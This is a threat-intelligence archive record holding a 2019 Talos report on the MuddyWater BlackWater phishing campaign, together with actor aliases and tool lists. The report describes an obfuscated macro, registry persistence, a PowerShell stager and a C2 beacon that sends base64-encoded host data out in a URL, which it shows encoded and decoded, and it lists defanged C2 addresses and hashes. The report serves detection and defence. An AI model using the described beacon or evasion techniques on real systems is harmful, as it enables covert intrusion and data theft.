{
    "id": "09aabe6a-4e54-42d6-b0ce-dcdadf496234",
    "created_at": "2023-01-12T15:10:59.942628Z",
    "updated_at": "2025-03-27T02:16:14.096955Z",
    "deleted_at": null,
    "sha1_hash": "051f1b403b5d1624d2e0e187866643675086a23d",
    "title": "2019-05-20 - Recent MuddyWater-associated BlackWater campaign shows signs of new anti-detection techniques",
    "authors": "",
    "file_creation_date": "2022-05-27T02:12:14Z",
    "file_modification_date": "2022-05-27T02:12:14Z",
    "file_size": 1204251,
    "plain_text": "# Recent MuddyWater-associated BlackWater campaign shows signs of new anti-detection techniques\n\n**[blog.talosintelligence.com/2019/05/recent-muddywater-associated-blackwater.html](https://blog.talosintelligence.com/2019/05/recent-muddywater-associated-blackwater.html)**\n\n_This blog was authored by_ _[Danny Adamitis,](https://twitter.com/dadamitis)_ _[David Maynor, and](https://twitter.com/Dave_Maynor)_ _[Kendall McKay](https://twitter.com/kkmckay22)_\n\n## Executive summary\n\nCisco Talos assesses with moderate confidence that a campaign we recently discovered\ncalled \"BlackWater\" is associated with suspected persistent threat actor MuddyWater. Newly\nassociated samples from April 2019 indicate attackers have added three distinct steps to\ntheir operations, allowing them to bypass certain security controls and suggesting that\nMuddyWater's tactics, techniques and procedures (TTPs) have evolved to evade detection. If\nsuccessful, this campaign would install a PowerShell-based backdoor onto the victim's\nmachine, giving the threat actors remote access. While this activity indicates the threat actor\nis taking steps to improve its operational security and avoid endpoint detection, the\nunderlying code remains unchanged. The findings outlined in this blog should help threat\nhunting teams identify MuddyWater's latest TTPs.\n\nIn this latest activity, the threat actor first added an obfuscated Visual Basic for Applications\n(VBA) script to establish persistence as a registry key. Next, the script triggered a PowerShell\nstager, likely in an attempt to masquerade as a red-teaming tool rather than an advanced\nactor. The stager would then communicate with one actor-controlled server to obtain a\ncomponent of the [FruityC2 agent script, an open-source framework on GitHub, to further](https://github.com/xtr4nge/FruityC2/blob/master/agent/ps_agent.ps1)\nenumerate the host machine. This could allow the threat actor to monitor web logs and\n\n\n-----\n\ndetermine whether someone uninvolved in the campaign made a request to their server in an\nattempt to investigate the activity. Once the enumeration commands would run, the agent\nwould communicate with a different C2 and send back the data in the URL field. This would\nmake host-based detection more difficult, as an easily identifiable \"errors.txt\" file would not\nbe generated. The threat actors also took additional steps to replace some variable strings in\nthe more recent samples, likely in an attempt to avoid signature-based detection from Yara\nrules.\n\nThis activity shows an increased level of sophistication from related samples observed\nmonths prior. Between February and March 2019, probable MuddyWater-associated\nsamples indicated that the threat actors established persistence on the compromised host,\nused PowerShell commands to enumerate the victim's machine and contained the IP\naddress of the actor's command and control (C2). All of these components were included in\nthe trojanized attachment, and therefore a security researcher could uncover the attackers'\nTTPs simply by obtaining a copy of the document. By contrast, the activity from April would\nrequire a multi-step investigative approach.\n\n## BlackWater document\n\nTalos has uncovered documents that we assess with moderate confidence are associated\nwith suspected persistent threat actor MuddyWater. MuddyWater has been active since at\n[least November 2017 and has been known to primarily target entities in the Middle East. We](https://unit42.paloaltonetworks.com/unit42-muddying-the-water-targeted-attacks-in-the-middle-east/)\nassess with moderate confidence that these documents were sent to victims via phishing\nemails. One such trojanized document was created on April 23, 2019. The original document\nwas titled \"company information list.doc\".\n\n\n-----\n\nOnce the document was opened, it prompted the user to enable the macro titled\n\"BlackWater.bas\". The threat actor password-protected the macro, making it inaccessible if a\nuser attempted to view the macro in Visual Basic, likely as an anti-reversing technique. The\n\"Blackwater.bas\" macro was obfuscated using a substitution cipher whereby the characters\nare replaced with their corresponding integer.\n\n_Image of the macro_\n\nThe macro contains a PowerShell script to persist in the \"Run\" registry key,\n\"KCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemTextEncoding\". The script\n\n\n-----\n\nthen called the file \\ProgramData\\SysTextEnc.ini every 300 seconds. The clear text version\nof the SysTextEnc.ini appears to be a lightweight stager.\n\n_Screenshot of the stager found in the document_\n\nThe stager then reached out to the actor-controlled C2 server located at\nhxxp://38[.]132[.]99[.]167/crf.txt. The clear text version of the crf.txt file closely resembled the\nPowerShell agent that was previously used by the MuddyWater actors when they targeted\n[Kurdish political groups and organizations in Turkey. The screenshot below shows the first](https://www.clearskysec.com/muddywater-targets-kurdish-groups-turkish-orgs/)\nfew lines of the PowerShell trojan. The actors have made some small changes, such as\naltering the variable names to avoid Yara detection and sending the results of the commands\nto the C2 in the URL instead of writing them to file. However, despite these changes, the\nfunctionality remains almost unchanged. Notably, a number of the PowerShell commands\nused to enumerate the host appear to be derived from a GitHub projected called FruityC2.\n\n\n-----\n\n_Image of the PowerShell script embedded in the document used to target Kurdish officials_\n\n_Image of the PowerShell script from the threat actor-controlled server_\n\nThis series of commands first sent a server hello message to the C2, followed by a\nsubsequent hello message every 300 seconds. An example of this beacon is\n\"hxxp://82[.]102[.]8[.]101:80/bcerrxy.php?rCecms=BlackWater\". Notably, the trojanized\ndocument's macro was also called \"BlackWater,\" and the value \"BlackWater\" was hard coded\ninto the PowerShell script.\n\n\n-----\n\nNext, the script would enumerate the victim s machine. Most of the PowerShell commands\nwould call Windows Management Instrumentation (WMI) and then query the following\ninformation:\n\nOperating system's name (i.e., the name of the machine)\nOperating system's OS architecture\nOperating system's caption\nComputer system's domain\nComputer system's username\nComputer's public IP address\n\nThe only command that did not call WMI was for the\n\"System.Security.Cryptography.MD5CryptoServiceProvider.ComputerHash\", or the\ncommand to obtain the security system's MD5 hash. This was likely pulled to uniquely\nidentify the workstation in case multiple workstations were compromised within the same\nnetwork. Once the host-based enumeration information was obtained, it was base64encoded and then appended to the URL post request to a C2, whereas in previous versions\nthis information was written to a text file. A copy of the encoded command is shown below:\n```\nhxxp://82[.]102[.]8[.]101/bcerrxy.php?\nriHl=RkYtRkYtRkYtRkYtRkYtRkYtRkYtRkYtRkYtRkYtRkYtRkYtRkYtRkYtRkYtRkYqMTk5NypFUDEq0D0uT\n\n```\nOnce decoded, the output of the above command became clear:\n```\nhxxp://82[.]102[.]8[.]101/bcerrxy.php?riHi=FF-FF-FF-FF-FF-FF-FF-FF-FF-FF-FF-FF-FF-FFFF-FF*1997*EP1*Ð=.Microsoft Windows 7 Professional*32-bit*USER-PC*WORKGROUPÐ=.*USERPC\\admin*192.168.000.01\n\n## Conclusion\n\n```\nIn addition to the new anti-detection steps outlined in this report, the MuddyWater actors\nhave made small modifications to avoid common host-based signatures and replaced\nvariable names to avoid Yara signatures. These changes were superficial, as their underlying\ncode base and implant functionality remained largely unchanged. However, while these\nchanges were minimal, they were significant enough to avoid some detection mechanisms.\nDespite last month's report on aspects of the MuddyWater campaign, the group is\nundeterred and continues to perform operations. Based on these observations, as well as\nMuddyWater's history of targeting Turkey-based entities, we assess with moderate\nconfidence that this campaign is associated with the MuddyWater threat actor group.\n\n## Indicators of compromise\n\n**Hashes**\n\n\n-----\n\n0f3cabc7f1e69d4a09856cc0135f7945850c1eb6aeecd010f788b3b8b4d91cad\n9d998502c3999c4715c880882efa409c39dd6f7e4d8725c2763a30fbb55414b7\n0d3e0c26f7f53dff444a37758b414720286f92da55e33ca0e69edc3c7f040ce2\nA3bb6b3872dd7f0812231a480881d4d818d2dea7d2c8baed858b20cb318da981\n6f882cc0cddd03bc123c8544c4b1c8b9267f4143936964a128aa63762e582aad\nBef9051bb6e85d94c4cfc4e03359b31584be027e87758483e3b1e65d389483e6\n4dd641df0f47cb7655032113343d53c0e7180d42e3549d08eb7cb83296b22f60\n576d1d98d8669df624219d28abcbb2be0080272fa57bf7a637e2a9a669e37acf\n062a8728e7fcf2ff453efc56da60631c738d9cd6853d8701818f18a4e77f8717\n\n**URLs**\n\nhxxp://38[.]132[.]99[.]167/crf.txt\nhxxp://82[.]102[.]8[.]101:80/bcerrxy.php?rCecms=BlackWater\nhxxp://82[.]102[.]8[.]101/bcerrxy.php?\nhxxp://94[.]23[.]148[.]194/serverScript/clientFrontLine/helloServer.php\nhxxp://94[.]23[.]148[.]194/serverScript/clientFrontLine/getCommand.php\nhxxp://94[.]23[.]148[.]194/serverScript/clientFrontLine/\nhxxp://136[.]243[.]87[.]112:3000/KLs6yUG5Df\nhxxp://136[.]243[.]87[.]112:3000/ll5JH6f4Bh\nhxxp://136[.]243[.]87[.]112:3000/Y3zP6ns7kG\n\n## Coverage\n\nDoc.Dropper.Pwshell::malicious.tht.talos\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-05-20 - Recent MuddyWater-associated BlackWater campaign shows signs of new anti-detection techniques.pdf"
    ],
    "report_names": [
        "2019-05-20 - Recent MuddyWater-associated BlackWater campaign shows signs of new anti-detection techniques.pdf"
    ],
    "threat_actors": [
        {
            "id": "2ed8d590-defa-4873-b2de-b75c9b30931e",
            "created_at": "2023-01-06T13:46:38.730137Z",
            "updated_at": "2025-03-27T02:00:02.903261Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "Boggy Serpens",
                "Mango Sandstorm",
                "TEMP.Zagros",
                "Static Kitten",
                "G0069",
                "TA450",
                "Earth Vetala",
                "Seedworm",
                "COBALT ULSTER",
                "ATK51"
            ],
            "source_name": "MISPGALAXY:MuddyWater",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "31e69945-6c1e-40c3-ba8e-a77e81dd142a",
            "created_at": "2024-05-01T02:03:08.047377Z",
            "updated_at": "2025-03-27T02:05:17.326452Z",
            "deleted_at": null,
            "main_name": "COBALT ULSTER",
            "aliases": [
                "ENT-11 ",
                "ITG17 ",
                "MERCURY ",
                "Mango Sandstorm ",
                "MuddyWater ",
                "STAC 1171 ",
                "Seedworm ",
                "Static Kitten ",
                "TEMP.Zagros ",
                "UNC3313 ",
                "Yellow Nix ",
                "Earth Vetala "
            ],
            "source_name": "Secureworks:COBALT ULSTER",
            "tools": [
                " Canopy",
                " CrackMapExec",
                " CredNinja",
                " Empire",
                " FORELORD",
                " Koadic",
                " LaZagne",
                " Ligolo",
                " MKL64",
                " Metasploit",
                " Mimikatz",
                " MiniDump",
                " Mori",
                " MuddyC2Go",
                " MuddyC3",
                " PhonyC2",
                " Plink",
                " PowGoop",
                " PowerStats",
                " RemoteUtilities",
                " Revsocks",
                " ScreenConnect",
                " SimpleHelp",
                " Small Sieve",
                " Syncro",
                " Venom Proxy",
                " WMIExec",
                "AnyDesk"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "02e1c2df-8abd-49b1-91d1-61bc733cf96b",
            "created_at": "2022-10-25T15:50:23.308924Z",
            "updated_at": "2025-03-27T02:00:55.437268Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "MuddyWater",
                "Earth Vetala",
                "Static Kitten",
                "Seedworm",
                "TEMP.Zagros",
                "Mango Sandstorm",
                "TA450"
            ],
            "source_name": "MITRE:MuddyWater",
            "tools": [
                "STARWHALE",
                "POWERSTATS",
                "Out1",
                "PowerSploit",
                "Small Sieve",
                "Mori",
                "Mimikatz",
                "LaZagne",
                "PowGoop",
                "CrackMapExec",
                "ConnectWise",
                "SHARPSTATS",
                "RemoteUtilities",
                "Koadic"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3c430d71-ab2b-4588-820a-42dd6cfc39fb",
            "created_at": "2022-10-25T16:07:23.880522Z",
            "updated_at": "2025-03-27T02:02:10.010443Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "ATK 51",
                "Boggy Serpens",
                "Cobalt Ulster",
                "ITG17",
                "Mango Sandstorm",
                "MuddyWater",
                "Operation BlackWater",
                "Operation Earth Vetala",
                "Operation Quicksand",
                "Seedworm",
                "Static Kitten",
                "T-APT-14",
                "TA450",
                "TEMP.Zagros",
                "Yellow Nix"
            ],
            "source_name": "ETDA:MuddyWater",
            "tools": [
                "Agentemis",
                "BugSleep",
                "CLOUDSTATS",
                "ChromeCookiesView",
                "Cobalt Strike",
                "CobaltStrike",
                "CrackMapExec",
                "DELPHSTATS",
                "EmPyre",
                "EmpireProject",
                "FruityC2",
                "Koadic",
                "LOLBAS",
                "LOLBins",
                "LaZagne",
                "Living off the Land",
                "MZCookiesView",
                "Meterpreter",
                "Mimikatz",
                "MuddyC2Go",
                "MuddyRot",
                "Mudwater",
                "POWERSTATS",
                "PRB-Backdoor",
                "PhonyC2",
                "PowGoop",
                "PowerShell Empire",
                "PowerSploit",
                "Powermud",
                "QUADAGENT",
                "SHARPSTATS",
                "SSF",
                "Secure Socket Funneling",
                "Shootback",
                "Smbmap",
                "Valyria",
                "chrome-passwords",
                "cobeacon",
                "prb_backdoor"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536259,
    "ts_updated_at": 1743041774,
    "ts_creation_date": 1653617534,
    "ts_modification_date": 1653617534,
    "files": {
        "pdf": "https://archive.orkl.eu/051f1b403b5d1624d2e0e187866643675086a23d.pdf",
        "text": "https://archive.orkl.eu/051f1b403b5d1624d2e0e187866643675086a23d.txt",
        "img": "https://archive.orkl.eu/051f1b403b5d1624d2e0e187866643675086a23d.jpg"
    }
}